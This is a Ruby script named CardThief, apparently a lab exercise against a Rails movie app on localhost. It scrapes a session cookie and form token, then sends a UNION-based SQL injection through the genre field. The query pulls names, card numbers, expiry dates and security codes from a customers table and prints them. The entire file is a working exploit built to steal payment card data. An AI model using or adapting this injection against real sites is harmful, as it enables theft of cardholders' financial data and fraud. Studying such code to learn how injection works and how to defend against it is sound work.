require 'socket'
require 'cgi'

class CreditCard
    attr_reader :customer_name, :card_number, :exp_month, :exp_year, :sec_code

	def initialize(args)
		@customer_name = args[:customer_name]
		@card_number = args[:card_number]
		@exp_month = args[:exp_month]
		@exp_year = args[:exp_year]
		@sec_code = args[:sec_code]
	end
end

class CardThief
	public

	def initialize
		@@host = "localhost"
		@@port = 3000
	end
	
    def printCreditCardInfo()
        card_info_my = stealCreditCardInfo()
		card_info_my.each do |card|
			puts "Card #" + card[0].to_s + "\n"
			puts "Customer Name:\t\t" + card[1].to_s #card.customer_name
			puts "Credit Card Number:\t" + card[2].to_s#.card_number
			puts "Expiration date:\t" + card[3].to_s+ "/" + card[4].to_s #.exp_month + "/" + card.exp_year
			puts "3-digit security code:\t" + card[5].to_s #.sec_code + "\n\n"
        end
    end
    
    private 

	
    def stealCreditCardInfo()
        
		card_info_regex = /<td>(.*)<\/td>/
        
		raw_card_info = fetchRawCreditCardInfo()
		
		
		nice_card_info = []
		b = raw_card_info.scan(card_info_regex)
		#puts raw_card_info
		array1 = []
		i = 0
		raw_card_info.scan(card_info_regex) do |c|
			array1 << c
			i = i + 1
			if i % 6 == 0
				nice_card_info << array1
				array1 =[]
			end
		end
		
		return nice_card_info
	end

	def fetchRawCreditCardInfo
		
		egg = "' AND 1=0 UNION SELECT billing_street, name, card_number, exp_month, exp_year, security_code, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='"
        
	    
		token_and_cookie = getAuthTokenAndSessionCookie()
		auth_token = token_and_cookie[0]; session_cookie = token_and_cookie[1];

		request_body = "authenticity_token=" + "&" \
		   "genre=" + CGI::escape(egg) + "&" \
		   "commit=Show+Movies\r\n\r\n"
		   
		http_request = "POST /movies/showGenre HTTP/1.1\r\n" \
			  "Host: " + @@host + ":" + @@port.to_s + "\r\n" \
			  "Connection: close\r\n" \
			  "Content-Type: application/x-www-form-urlencoded\r\n" \
			  "Content-Length: " + request_body.size.to_s + "\r\n" \
			  "Cookie: _session_id=" + session_cookie.to_s + "\r\n" \
			  "\r\n"
		http_request += request_body

				  
		s = TCPSocket.open(@@host, @@port)
		s.puts http_request
		http_response = s.read

		return http_response
	end

	def getAuthTokenAndSessionCookie
		auth_token_regex = /<input name="authenticity_token" type="hidden" value="(.*)" \/>/ 
		session_cookie_regex = /^Set-Cookie: _session_id=([a-zA-Z0-9]*);/
        
		
		http_request = "GET /movies/selectGenre HTTP/1.1\r\n" \
				  "Connection: close\r\n" \
				  "Host: " + @@host + ":" + @@port.to_s + "\r\n" \
				  "\r\n"

				  
		s = TCPSocket.open(@@host, @@port)
		s.puts http_request
		http_response = s.read

		
		auth_token = (http_response =~ auth_token_regex) ? $1 : nil
		session_cookie = (http_response =~ session_cookie_regex) ? $1 : nil
        
		return [auth_token, session_cookie]
	end

end


t = CardThief.new()
t.printCreditCardInfo()
